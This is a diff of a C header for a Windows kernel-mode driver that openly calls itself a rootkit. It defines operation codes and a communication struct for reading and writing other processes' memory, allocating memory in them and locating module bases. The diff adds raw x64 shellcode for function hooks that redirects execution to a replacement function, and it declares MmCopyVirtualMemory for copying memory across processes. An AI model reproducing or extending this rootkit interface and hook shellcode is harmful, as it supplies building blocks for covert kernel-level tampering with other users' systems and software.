@@ -1,9 +1,19 @@
 #pragma once
 #include <ntifs.h>
-#include <ntddk.h>
 #include <wdm.h>
+#include <ntddk.h>
 #include <minwindef.h>
-#pragma comment(lib, "ntoskrnl.lib")
+#include "problematic.h"
+//#pragma comment(lib, "ntoskrnl.lib")
+//#pragma comment(lib, "ntdll.lib")
+//#pragma comment(lib, "bufferoverflowk.lib")
+#define REGULAR_BUFFER 0xdeafbeed  // Represents a normal buffer
+
+// Default shellcode for hooks:
+CONST BYTE DEFAULT_SHELLCODE[] = { 0x51,  // push rcx
+0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rcx, ReplacementFunc (64 bit value of address)
+0x48, 0x87, 0x0C, 0x24,  // xchg QWORD PTR [rsp], rcx  (put 64 bit address instead of original rcx in stack)
+0xC3 };  // ret (jump to rcx value - the value of ReplacementFunc)
 
 
 /*
@@ -143,6 +153,7 @@ typedef enum _SYSTEM_INFORMATION_CLASS {
 } SYSTEM_INFORMATION_CLASS;
 
 
+
 /*
 ============================
 DEPENDENCIES OF MAIN STRUCT:
@@ -185,7 +196,6 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_WRITE = 0x0B0B3456,
 	RKOP_READ = 0x0B0B1234,
 	RKOP_MDLBASE = 0x0B0B6789,
-	RKOP_DSPSTR = 0x0B0B6666,
 	RKOP_SYSINFO = 0x0B0B5454,
 	RKOP_PRCMALLOC = 0XBB00BB00,
 
@@ -213,6 +223,13 @@ typedef struct _RKSYSTEM_INFORMATION_CLASS {
 } RKSYSTEM_INFORMATION_CLASS, * PRKSYSTEM_INFORMATION_CLASS;
 
 
+// Struct for passing string data -
+typedef struct _STRING_DATA {
+	const char* String;
+	SIZE_T StrLen;
+} STRING_DATA, * PSTRING_DATA;
+
+
 /*
 ============
 MAIN STRUCT:
@@ -229,13 +246,13 @@ typedef struct _ROOTKIT_MEMORY {  // Used for communicating with the KM driver
 	ULONG64 Size; // size of memory chunk
 	USHORT MainPID; // process that works on the memory
 	USHORT SemiPID;  // (if the operation requests for reading) what is the PID of the destination process?
+	USHORT MedPID;  // If needed, provide medium process PID
 	const char* MdlName;  // (if the operation requests for a module base) what is the name of the module?
 	const char* DstMdlName;  // (if the operation requests for a module base) what is the name of the module?
 	ROOTKIT_UNEXERR Unexpected;  // data about an unexpected error that happened during the operation, is not relevant to driver
 	BOOL IsFlexible;  // specifies if operations can be flexible
 	PVOID Reserved;  // used for extra parameters needed to function
 }ROOTKIT_MEMORY;
-
 
 /*
 ======================================
@@ -250,12 +267,20 @@ typedef struct _RKSYSTEM_INFORET {
 	PVOID Buffer;
 } RKSYSTEM_INFORET;
 
-
 /*
 ================================================
 DEPENDENCIES OF IMPLEMENTATION / FUNCTION USAGE:
 ================================================
 */
+
+
+typedef NTSTATUS(*QUERY_INFO_PROCESS) (
+	__in HANDLE ProcessHandle,
+	__in PROCESSINFOCLASS ProcessInformationClass,
+	__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
+	__in ULONG ProcessInformationLength,
+	__out_opt PULONG ReturnLength
+	);
 
 
 // data about an about-to-run/running usermode process (not used currently) -
@@ -376,7 +401,7 @@ extern "C" __declspec(dllimport) NTSTATUS NTAPI ZwProtectVirtualMemory
 
 
 // Copy virtual memory from one process into another process (can also be used in KM with PeGetCurrentProcess as the PEPROCESS) -
-extern "C" NTSTATUS NTAPI MmCopyVirtualMemory 
+extern "C" NTSTATUS NTAPI MmCopyVirtualMemory
 (
 	PEPROCESS SourceProcess,
 	PVOID SourceAddress,
